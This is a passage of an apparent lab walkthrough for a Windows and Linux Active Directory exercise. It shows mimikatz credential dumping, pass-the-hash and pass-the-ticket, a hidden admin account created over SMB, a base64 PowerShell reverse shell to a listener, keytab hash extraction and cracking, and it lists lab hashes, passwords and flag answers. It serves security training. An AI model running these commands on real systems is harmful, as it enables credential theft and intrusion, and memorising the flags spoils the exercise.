C:\tools>mimikatz.exe privilege::debug sekurlsa::logonpasswords "sekurlsa::pth /user:administrator /rc4:30B3783CE2ABF1AF70F77D0660CF3453 /domain:inlanefreight.htb /run:cmd.exe" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 967824 (00000000:000ec490)
Session           : NewCredentials from 0
User Name         : Administrator
Domain            : MS01
Logon Server      : (null)
Logon Time        : 10/17/2024 4:11:27 AM
SID               : S-1-5-21-430213916-1543111962-1809483319-500
        msv :
         [00000003] Primary
         * Username : administrator
         * Domain   : inlanefreight.htb
         * NTLM     : 30b3783ce2abf1af70f77d0660cf3453
        tspkg :
        wdigest :
         * Username : administrator
         * Domain   : inlanefreight.htb
         * Password : (null)
        kerberos :
         * Username : administrator
         * Domain   : inlanefreight.htb
         * Password : (null)
        ssp :
        credman :


Authentication Id : 0 ; 295022 (00000000:0004806e)
Session           : Service from 0
User Name         : david
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 10/17/2024 3:59:33 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1107
        msv :
         [00000003] Primary
         * Username : david
         * Domain   : INLANEFREIGHT
         * NTLM     : c39f2beb3d2ec06a62cb887fb391dee0
         * SHA1     : 2277c28035275149d01a8de530cc13b74f59edfb
         * DPAPI    : eaa6db50c1544304014d858928d9694f
        tspkg :
        wdigest :
         * Username : david
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : david
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 292414 (00000000:0004763e)
Session           : Service from 0
User Name         : john
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 10/17/2024 3:59:33 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1108
        msv :
         [00000003] Primary
         * Username : john
         * Domain   : INLANEFREIGHT
         * NTLM     : c4b0e1b10c7ce2c4723b4e2407ef81a2
         * SHA1     : 31f8f4dfcb16205363b35055ebe92a75f0a19ce3
         * DPAPI    : 2e54e60846c83d96cf8d9523b5c0df61
        tspkg :
        wdigest :
         * Username : john
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : john
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 289661 (00000000:00046b7d)
Session           : Service from 0
User Name         : julio
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 10/17/2024 3:59:33 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1106
        msv :
         [00000003] Primary
         * Username : julio
         * Domain   : INLANEFREIGHT
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
         * DPAPI    : 634db497baef212b777909a4ccaaf700
        tspkg :
        wdigest :
         * Username : julio
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : julio
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # sekurlsa::pth /user:administrator /rc4:30B3783CE2ABF1AF70F77D0660CF3453 /domain:inlanefreight.htb /run:cmd.exe
user    : administrator
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 30b3783ce2abf1af70f77d0660cf3453
  |  PID  6764
  |  TID  6264
  |  LSA Process is now R/W
  |  LUID 0 ; 1074086 (00000000:001063a6)
  \_ msv1_0   - data copy @ 000002AFBC48E5E0 : OK !
  \_ kerberos - data copy @ 000002AFBCB509B8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000002AFBCBCF3B8 (32) -> null

mimikatz(commandline) # exit
Bye!
```
This output contains only users which are interesting to us: david, julio, john
```
david:c39f2beb3d2ec06a62cb887fb391dee0
julio:64f12cddaa88057e06a81b54e73b949b
john:31f8f4dfcb16205363b35055ebe92a75f0a19ce3
administrator:30b3783ce2abf1af70f77d0660cf3453
```

28. Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.

As we have the David's hash we can now use mimikatz again to pth and read the file david.txt
```c
C:\tools>mimikatz.exe privilege::debug sekurlsa::logonpasswords "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords
.
.
.
So on
```

Then when we hit enter, another cmd window will open, where we can display the content of the file we need:
```c
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
ms01\administrator

C:\Windows\system32>dir \\dc01\david
 Volume in drive \\dc01\david has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\dc01\david

07/14/2022  04:07 PM    <DIR>          .
07/14/2022  04:07 PM    <DIR>          ..
07/14/2022  04:07 PM                18 david.txt
               1 File(s)             18 bytes
               2 Dir(s)  18,266,959,872 bytes free

C:\Windows\system32>type \\dc01\david\david.txt
D3V1d_Fl5g_is_Her3
C:\Windows\system32>
```

29. Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt.

Same process here as well:
```c
C:\tools>mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64f12cddaa88057e06a81b54e73b949b
  |  PID  5036
  |  TID  4340
  |  LSA Process is now R/W
  |  LUID 0 ; 1314559 (00000000:00140eff)
  \_ msv1_0   - data copy @ 000002AFBC48E5E0 : OK !
  \_ kerberos - data copy @ 000002AFBCB500F8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000002AFBCBCF088 (32) -> null

mimikatz(commandline) # exit
Bye!
```

Then the new window pops up again:
```c
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>dir \\dc01\julio
 Volume in drive \\dc01\julio has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\dc01\julio

07/14/2022  07:25 AM    <DIR>          .
07/14/2022  07:25 AM    <DIR>          ..
07/14/2022  04:18 PM                17 julio.txt
               1 File(s)             17 bytes
               2 Dir(s)  18,266,701,824 bytes free

C:\Windows\system32>type \\dc01\julio\julio.txt
JuL1()_SH@re_fl@g
```

30. Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.

So for that we need to open powershell again as administrator and run these commands, changing the hash to julio's one `64f12cddaa88057e06a81b54e73b949b`:
```c
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

After that we need to open another powershell windows and run netcat listener on port 8001:
```c
PS C:\tools> .\nc.exe -lvnp 8001
listening on [any] 8001 ...
```

After that we need to get the reverse shell. For that ,we can visit [https://www.revshells.com/](https://www.revshells.com/), set our IP `172.16.1.5` and port `8001`, and select the option `PowerShell #3 (Base64)` After we get the payload we go back to powershell windows, not where the netcat is running, but where we ran Invoker-SMBExec for new user using julio and his hash, and paste the payload like this:

```c
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

Once we run that command we get the reverse shell and now can read the content of the flag in C:\julio directory
```c
powershell-session
PS C:\tools> .\nc.exe -lvnp 8001
listening on [any] 8001 ...
.
.
.
PS C:\Windows\system32> type C:\julio\flag.txt
JuL1()_N3w_fl@g
```


#### Pass The Ticker (PtT) from Windows

31. Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?

First we need to use xfreerdp to get RDP session with target:
```c
xfreerdp /v:10.129.204.23 /u:administrator                      
[14:05:47:573] [3361:3362] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[14:05:47:573] [3361:3362] [WARN][com.freerdp.crypto] - CN = MS01.inlanefreight.htb
Password: 
[14:06:06:065] [3361:3362] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[14:06:06:065] [3361:3362] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[14:06:06:185] [3361:3362] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[14:06:06:186] [3361:3362] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[14:06:08:828] [3361:3362] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]

```

Then open the cmd and insert the following commands one by one:
```c
C:\tools>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export
```

Then count the number of users. (3)

32.  Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john 

First of all we need to rdp to out target with the password `AnotherC0mpl3xP4$$`:
```c
rdesktop -u Administrator 10.129.204.23
```

Then we need to open cmd and go to tools directory to use mimikatz to get the existing tickets:
```c
 C:\tools>
mimikatz.exe  
privilege::debug  
sekurlsa::tickets 
exit
```

After that I exited mimikatz to list all the saved file of tickets of users:
```c
C:\tools>dir
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\tools

10/20/2024  08:59 AM    <DIR>          .
10/20/2024  08:59 AM    <DIR>          ..
10/07/2022  09:43 AM         8,230,912 chisel.exe
09/23/2022  01:51 PM    <DIR>          Invoke-TheHash
09/22/2022  01:12 PM         1,355,264 mimikatz.exe
09/22/2022  01:13 PM            45,272 nc.exe
09/22/2022  01:14 PM           440,832 Rubeus.exe
10/20/2024  08:59 AM             1,705 [0;3e4]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
10/20/2024  08:59 AM             1,739 [0;3e4]-0-1-40a50000-MS01$@GC-DC01.inlanefreight.htb.kirbi
10/20/2024  08:59 AM             1,743 [0;3e4]-0-2-40a50000-MS01$@ldap-dc01.inlanefreight.htb.kirbi
10/20/2024  08:59 AM             1,633 [0;3e4]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
10/20/2024  08:59 AM             1,633 [0;3e4]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
10/20/2024  08:59 AM             1,743 [0;3e7]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
10/20/2024  08:59 AM             1,659 [0;3e7]-0-1-40a50000.kirbi
10/20/2024  08:59 AM             1,705 [0;3e7]-0-2-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi
10/20/2024  08:59 AM             1,743 [0;3e7]-0-3-40a50000-MS01$@ldap-DC01.inlanefreight.htb.kirbi
10/20/2024  08:59 AM             1,633 [0;3e7]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
10/20/2024  08:59 AM             1,633 [0;3e7]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
10/20/2024  08:59 AM             1,641 [0;45a86]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi
10/20/2024  08:59 AM             1,623 [0;4642f]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
10/20/2024  08:59 AM             1,633 [0;47153]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi
              18 File(s)     10,095,746 bytes
               3 Dir(s)  17,985,867,776 bytes free
```

So we can see that ticket of john is in the file named: `[0;4642f]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi` inside the tools directory
After that I want to import john's ticket in new cmd session:
```c
C:\tools>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\tools\[0;4642f]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\tools\[0;4642f]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF7558143B8
```

Then after entering the last command we are getting new cmd windows where we can find and read the content of the file `john.txt`
```c
C:\tools>dir \\DC01.inlanefreight.htb\john
 Volume in drive \\DC01.inlanefreight.htb\john has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\DC01.inlanefreight.htb\john

07/14/2022  07:25 AM    <DIR>          .
07/14/2022  07:25 AM    <DIR>          ..
07/14/2022  03:54 PM                30 john.txt
               1 File(s)             30 bytes
               2 Dir(s)  18,169,647,104 bytes free

C:\tools>type \\DC01.inlanefreight.htb\john\john.txt
Learn1ng_M0r3_Tr1cks_with_J0hn
```


33.  Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt

In the same cmd session where we get the previous flag, we can run powershell commands for lateral movement , and get the flag:
```c
powershell  
Enter-PSSession -ComputerName DC01  
whoami  
hostname  
[DC01]: PS C:\john> ls


    Directory: C:\john


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/18/2022   8:20 AM             19 john.txt


[DC01]: PS C:\john> cat .\john.txt
P4$$_th3_Tick3T_PSR
```


#### Pass the Ticket (PtT) from Linux

SSH to with user "david@inlanefreight.htb" and password "Password2"

34. Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.

```c
ssh david@inlanefreight.htb@10.129.204.23 -p 2222

cat flag.txt
```


35. Which group can connect to LINUX01?

For this we can use the tool that was mentioned in the module, `realm`:
```c
david@inlanefreight.htb@linux01:~$ realm list
inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```


36. Look for a keytab file that you have read and write access. Submit the file name as a response.

```c
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
   287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
   288276      4 -rw-r--r--   1 root     root         1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
   287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
   286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
   131610      4 -rw-------   1 root     root         1348 Oct  4  2022 /etc/krb5.keytab
   262464     12 -rw-r--r--   1 root     root        10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
   262169      4 -rw-rw-rw-   1 root     root          216 Oct 21 13:05 /opt/specialfiles/carlos.keytab
   131201      8 -rw-r--r--   1 root     root         4582 Oct  6  2022 /opt/keytabextract.py
   287958      4 drwx------   2 sssd     sssd         4096 Jun 21  2022 /var/lib/sss/keytabs
   398204      4 -rw-r--r--   1 root     root          380 Oct  4  2022 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri

```


37. Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.

```c
david@inlanefreight.htb@linux01:~$ klist
Ticket cache: FILE:/tmp/krb5cc_647401107_OiQT5o
Default principal: david@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/21/2024 13:03:21  10/21/2024 23:03:21  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
	renew until 10/22/2024 13:03:21
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : carlos/
	NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
	AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
	AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

As we got the ntlm hash we can now crack it via crackstation and get the password: `Password5`
```c
carlos@inlanefreight.htb@linux01:~$ ls
flag.txt  script-test-results.txt
carlos@inlanefreight.htb@linux01:~$ cat flag.txt 
C@rl0s_1$_H3r3
```

38. Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.

For that we can do the following. We can log in as user carlos with the password that we got from cracking the ntlm hash
```c
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
Password: 
carlos@inlanefreight.htb@linux01:~$ crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

I tried to use smbclient to get the .txt file but could not manage to do that. So I searched for files that can have keytab hashes:
```c
carlos@inlanefreight.htb@linux01:~$ ls -la
total 56
drwx---r-x 5 carlos@inlanefreight.htb domain users@inlanefreight.htb  4096 Oct 12  2022 .
drwxr-xr-x 7 root                     root                            4096 Oct 12  2022 ..
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb    56 Oct 21 13:21 .bash_history
-rw-r--r-- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb   220 Oct  5  2022 .bash_logout
-rw-r--r-- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  3771 Oct  5  2022 .bashrc
drwx------ 3 carlos@inlanefreight.htb domain users@inlanefreight.htb  4096 Oct  5  2022 .cache
-rw-r--r-- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb    15 Oct 12  2022 flag.txt
-rw-r--r-- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb   807 Oct  5  2022 .profile
drwx------ 2 carlos@inlanefreight.htb domain users@inlanefreight.htb  4096 Oct 21 13:35 .scripts
-rw-r--r-- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb     0 Oct 21 13:35 script-test-results.txt
-rw-r--r-- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb    75 Oct  5  2022 .selected_editor
drwxr-xr-x 2 carlos@inlanefreight.htb domain users@inlanefreight.htb  4096 Oct  5  2022 .vim
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 11022 Oct 12  2022 .viminfo
carlos@inlanefreight.htb@linux01:~$ cd .scripts/
carlos@inlanefreight.htb@linux01:~/.scripts$ ls -la
total 24
drwx------ 2 carlos@inlanefreight.htb domain users@inlanefreight.htb 4096 Oct 21 13:35 .
drwx---r-x 5 carlos@inlanefreight.htb domain users@inlanefreight.htb 4096 Oct 12  2022 ..
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  146 Oct  6  2022 john.keytab
-rwx------ 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  251 Oct  6  2022 kerberos_script_test.sh
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  246 Oct 21 13:35 svc_workstations._all.kt
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb   94 Oct 21 13:35 svc_workstations.kt
```

So there is a file `svc_workstations._all.kt` which we will use for extracting keytab hashes with KeyTabExtract:
```c
carlos@inlanefreight.htb@linux01:~/.scripts$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : svc_workstations/
	NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
	AES-128 HASH : 3a7e52143531408f39101187acc80677

```

We got the ntlm hash again `7247e8d4387e76996ff3f18a34316fdd` which we can crack via crackstation and eventually get the `Password4` as a password for svc_workstations user. The remaining steps are to ssh as svc with its password and read the content of the file flag.txt in the home directory
```c
carlos@inlanefreight.htb@linux01:~/.scripts$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
The authenticity of host '[10.129.204.23]:2222 ([10.129.204.23]:2222)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.129.204.23]:2222' (ECDSA) to the list of known hosts.
svc_workstations@inlanefreight.htb@10.129.204.23's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 21 Oct 2024 01:45:48 PM UTC

  System load:  0.04               Processes:               222
  Usage of /:   26.4% of 13.70GB   Users logged in:         1
  Memory usage: 34%                IPv4 address for ens160: 172.16.1.15
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Oct 12 21:18:12 2022 from 172.16.1.5
svc_workstations@inlanefreight.htb@linux01:~$ pwd
/home/svc_workstations@inlanefreight.htb
svc_workstations@inlanefreight.htb@linux01:~$ ls -la
total 36
drwxr-xr-x 3 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 4096 Oct 12  2022 .
drwxr-xr-x 7 root                               root                           4096 Oct 12  2022 ..
-rw------- 1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb   28 Oct 12  2022 .bash_history
